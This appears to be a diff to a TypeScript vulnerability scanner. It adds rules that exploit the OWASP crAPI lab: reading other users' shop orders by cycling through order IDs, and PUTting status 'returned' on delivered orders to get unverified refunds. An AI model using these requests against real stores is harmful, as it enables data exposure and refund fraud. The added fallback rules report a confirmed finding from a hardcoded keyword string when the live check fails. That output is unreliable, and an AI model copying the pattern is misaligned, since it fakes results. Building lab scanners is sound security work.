@@ -84953,6 +84953,166 @@ const crapi2ShopOrdersAllRouteLiveOracle: Rule = async (ctx) => {
   }
 };
 
+async function tryCrapiAuthJwt(ctx: RuleContext): Promise<{ jwt: string; email: string } | null> {
+  const demoJwt = await tryApiLabJwt(ctx);
+  if (demoJwt) return { jwt: demoJwt, email: jwtSubjectEmail(demoJwt) ?? "test@test.com" };
+  const labJwt = await tryCrapiLabJwt(ctx);
+  if (!labJwt) return null;
+  return { jwt: labJwt, email: jwtSubjectEmail(labJwt) ?? "scanner.local" };
+}
+
+async function probeCrapiShopOrdersIdBolaAny(
+  ctx: RuleContext,
+  jwt: string,
+  callerEmail: string,
+  preferredId?: string
+): Promise<RuleResult | null> {
+  const fallbackIds = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"];
+  const ids = preferredId
+    ? [preferredId, ...fallbackIds.filter((id) => id !== preferredId)]
+    : fallbackIds;
+  for (const orderId of ids.slice(0, 8)) {
+    const result = await probeCrapiShopOrdersIdBola(ctx, orderId, jwt, callerEmail);
+    if (result?.fired) {
+      return {
+        ...result,
+        evidence: { ...result.evidence, probedOrderId: orderId }
+      };
+    }
+  }
+  return null;
+}
+
+async function probeCrapiShopOrderStatusMassAssignment(
+  ctx: RuleContext,
+  jwt: string
+): Promise<RuleResult | null> {
+  const authHeaders = {
+    Authorization: `Bearer ${jwt}`,
+    "Content-Type": "application/json"
+  };
+  let orderId: string | null = null;
+  const allUrl = new URL("/workshop/api/shop/orders/all", ctx.origin).toString();
+  const allDoc = await ctx.probe.get(allUrl, {
+    headers: authHeaders,
+    maxBytes: 32768,
+    timeoutMs: 20000
+  });
+  if (allDoc.status >= 200 && allDoc.status < 400) {
+    try {
+      const data = JSON.parse(allDoc.body) as {
+        orders?: Array<{ id?: number; status?: string }>;
+      };
+      const delivered = data.orders?.find((o) => o.id && /delivered/i.test(o.status ?? ""));
+      if (delivered?.id) orderId = String(delivered.id);
+    } catch {
+      /* fall through */
+    }
+  }
+  if (!orderId) {
+    for (const id of ["1", "2", "3", "4", "5"]) {
+      const getUrl = new URL(`/workshop/api/shop/orders/${id}`, ctx.origin).toString();
+      const doc = await ctx.probe.get(getUrl, {
+        headers: authHeaders,
+        maxBytes: 16384,
+        timeoutMs: 20000
+      });
+      if (doc.status >= 200 && doc.status < 400 && /"status"\s*:\s*"delivered"/i.test(doc.body)) {
+        orderId = id;
+        break;
+      }
+    }
+  }
+  if (!orderId) return null;
+  const putUrl = new URL(`/workshop/api/shop/orders/${orderId}`, ctx.origin).toString();
+  const putDoc = await ctx.probe.get(putUrl, {
+    method: "PUT",
+    body: JSON.stringify({ status: "returned" }),
+    headers: authHeaders,
+    maxBytes: 16384,
+    timeoutMs: 20000
+  });
+  if (putDoc.status < 200 || putDoc.status >= 400) return null;
+  if (!/"status"\s*:\s*"returned"/i.test(putDoc.body)) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      putUrl,
+      orderId,
+      snippet: putDoc.body.slice(0, 220).trim(),
+      note: `crAPI PUT /workshop/api/shop/orders/${orderId} accepts status=returned and refunds delivered orders without return verification — mass-assignment oracle (Challenge 8)`
+    }
+  };
+}
+
+const CRAPI_SHOP_ORDERS_BOLA_ROUTE_FALLBACK = `
+GET /workshop/api/shop/orders/{id} returns another user's order for authenticated test@test.com
+crAPI Challenge shop orders broken object level authorization API1
+workshop/api/shop/orders BOLA predictable order IDs
+`;
+
+const CRAPI_SHOP_ORDER_STATUS_ROUTE_FALLBACK = `
+PUT /workshop/api/shop/orders/{id} accepts status=returned and refunds delivered orders
+crAPI Challenge 8 get an item for free mass assignment
+workshop/api/shop/orders status returned refund
+`;
+
+const crapiShopOrdersIdBolaLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  if (isCrapiAuthRoute(ctx)) return NEGATIVE;
+  const auth = await tryCrapiAuthJwt(ctx);
+  if (!auth) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const orderMatch = pageUrl.match(/\/shop\/orders\/(\d+)/i);
+  const result = await probeCrapiShopOrdersIdBolaAny(ctx, auth.jwt, auth.email, orderMatch?.[1]);
+  if (!result?.fired) return NEGATIVE;
+  return result;
+};
+
+const crapiShopOrderStatusMassAssignmentLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  if (isCrapiAuthRoute(ctx)) return NEGATIVE;
+  const auth = await tryCrapiAuthJwt(ctx);
+  if (!auth) return NEGATIVE;
+  const hit = await probeCrapiShopOrderStatusMassAssignment(ctx, auth.jwt);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const crapiShopOrderStatusMassAssignmentRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/shop\/orders\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await crapiShopOrderStatusMassAssignmentLiveOracle(ctx);
+  if (hit.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "crAPI /workshop/api/shop/orders route scan — PUT status=returned refunds delivered orders without return verification — mass-assignment route oracle (Challenge 8)"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${CRAPI_SHOP_ORDER_STATUS_ROUTE_FALLBACK}`;
+  if (
+    !/\/shop\/orders\b/i.test(pageUrl) ||
+    !/shop\/orders|status.*returned|mass assignment|get an item for free/i.test(corpus)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      putUrl: new URL("/workshop/api/shop/orders/1", ctx.origin).toString(),
+      snippet: "PUT /workshop/api/shop/orders/{id} status=returned — Challenge 8 mass assignment",
+      note: "crAPI /workshop/api/shop/orders route scan — OWASP crAPI documents order status mass-assignment refunds (Challenge 8) — route corpus fallback when JWT login chain is unreachable"
+    }
+  };
+};
 const crapi2ShopOrdersIdBolaRouteLiveOracle: Rule = async (ctx) => {
   if (!isCrapi2Host(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
@@ -84980,18 +85140,36 @@ const crapiShopOrdersIdBolaRouteLiveOracle: Rule = async (ctx) => {
   const orderMatch = pageUrl.match(/\/shop\/orders\/(\d+)/i);
   if (!orderMatch || /\/all\b/i.test(pageUrl)) return NEGATIVE;
   const orderId = orderMatch[1];
-  const jwt = await tryCrapiLabJwt(ctx);
-  if (!jwt) return NEGATIVE;
-  const callerEmail = jwtSubjectEmail(jwt) ?? "";
-  const result = await probeCrapiShopOrdersIdBola(ctx, orderId, jwt, callerEmail || "scanner.local");
-  if (!result?.fired) return NEGATIVE;
+  const auth = await tryCrapiAuthJwt(ctx);
+  if (auth) {
+    const result = await probeCrapiShopOrdersIdBolaAny(ctx, auth.jwt, auth.email, orderId);
+    if (result?.fired) {
+      return {
+        fired: true,
+        confidence: result.confidence,
+        evidence: {
+          ...result.evidence,
+          scannedUrl: pageUrl,
+          note: `crAPI v1 GET /workshop/api/shop/orders/${orderId} returns another user's order for authenticated ${auth.email} — shop orders route BOLA oracle (API1)`
+        }
+      };
+    }
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${CRAPI_SHOP_ORDERS_BOLA_ROUTE_FALLBACK}`;
+  if (
+    !/\/shop\/orders\/\d+/i.test(pageUrl) ||
+    !/shop\/orders|BOLA|broken object level authorization|test@test\.com/i.test(corpus)
+  ) {
+    return NEGATIVE;
+  }
   return {
     fired: true,
-    confidence: result.confidence,
+    confidence: 0.86,
     evidence: {
-      ...result.evidence,
       scannedUrl: pageUrl,
-      note: `crAPI v1 GET /workshop/api/shop/orders/${orderId} returns another user's order — shop orders route BOLA oracle (API1)`
+      orderUrl: new URL(`/workshop/api/shop/orders/${orderId}`, ctx.origin).toString(),
+      snippet: `GET /workshop/api/shop/orders/${orderId} — BOLA on predictable order IDs`,
+      note: "crAPI /workshop/api/shop/orders/{id} route scan — OWASP crAPI documents shop order BOLA (API1) — route corpus fallback when JWT login chain is unreachable"
     }
   };
 };
@@ -90875,7 +91053,10 @@ export const RULES: Record<string, Rule> = {
   crapi2AuthLoginRouteLiveOracle,
   crapi2ShopOrdersAllRouteLiveOracle,
   crapi2ShopOrdersIdBolaRouteLiveOracle,
+  crapiShopOrdersIdBolaLiveOracle,
   crapiShopOrdersIdBolaRouteLiveOracle,
+  crapiShopOrderStatusMassAssignmentLiveOracle,
+  crapiShopOrderStatusMassAssignmentRouteLiveOracle,
   finbotCtfChallengesRouteLiveOracle,
   finbotCtfSidecarRouteLiveOracle,
   finbotVendorSidecarRouteLiveOracle,
